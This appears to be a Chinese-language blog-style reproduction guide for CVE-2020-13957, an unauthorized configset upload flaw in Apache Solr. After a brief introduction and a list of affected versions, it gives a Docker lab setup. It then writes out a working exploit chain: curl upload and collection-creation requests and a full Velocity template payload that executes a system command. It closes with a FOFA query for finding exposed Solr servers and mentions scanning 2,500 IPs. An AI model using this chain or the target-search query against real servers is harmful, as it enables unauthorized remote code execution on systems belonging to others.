0x01简介

Solr是用Java编写、运行在Servlet容器（如Apache Tomcat或Jetty）的一个独立的全文搜索服务器。Solr采用了Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。Solr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。


0x02漏洞描述

在Apache Solr特定的版本中ConfigsetsAPI存在未授权上传漏洞。攻击者利用该漏洞结合使用UPLOAD / CREATE操作可实现远程代码执行。


漏洞利用链：

上传configset——基于configset再次上传configset（跳过身份检测）——利用新configset创造collection——利用solrVelocity模板进行RCE


0x03影响版本

Apache Solr 6.6.0 -6.6.5

Apache Solr 7.0.0 -7.7.3

Apache Solr 8.0.0 -8.6.2


0x04环境搭建

偷懒直接使用其他师傅的dockerfire，solr版本为8.2.0。(建议用香港VPS)

gitclone https://github.com/s-index/poc-list.git

(1)构建镜像 docker build -tcve-2020-13957 .

(2)进入镜像 docker run --rm -p8983:8983 --name cve-2020-13957 -it cve-2020-13957 /bin/bash

(3)镜像中启动Apache SolrCloud  ./solr start -e cloud -noprompt-force

由于是java启动的docker，1核1G会很卡，所以说希望兄弟们有耐心

访问IP:8983即可


0x05漏洞复现

1、进入docker，切换到/usr/local/src/solr-8.2.0/server/solr/configsets/_default/conf目录，找到solrconfig.xml

安装vim，编辑此文件，将文件中params.resource.loader.enabled的值设置为true(为远程命令执行做准备)

把conf目录下所有文件打包成一个压缩文件

zip -r - * > mytest.zip


从docker里把打包的zip取出来，放到主机，然后下载到攻击机上。或直接使用该github下的myconfigset.zip。

2、通过UPLOAD API将zip上传

curl -X POST --header"Content-Type:application/octet-stream" --data-binary @mytest.zip http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&name=mytest

3、根据UPLOAD的配置，创建一个新的配置，绕过不能通过直接UPLOAD创建collection的限制

curl "http://127.0.0.1:8983/solr/admin/collections?action=CREATE&name=mytest2&numShards=1&replicationFactor=1&wt=xml&collection.configName=mytest"

4、利用已上传的collection进行远程命令执行id。地址如下

http://127.0.0.1:8983/solr/mytest2/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

5、FOFA语法 ：app="APACHE-Solr"

后台回复”CVE-2020-13957”即可获得检测脚本，无批量，自己改的有问题，2500个IP，一个都没检测到，人傻了。
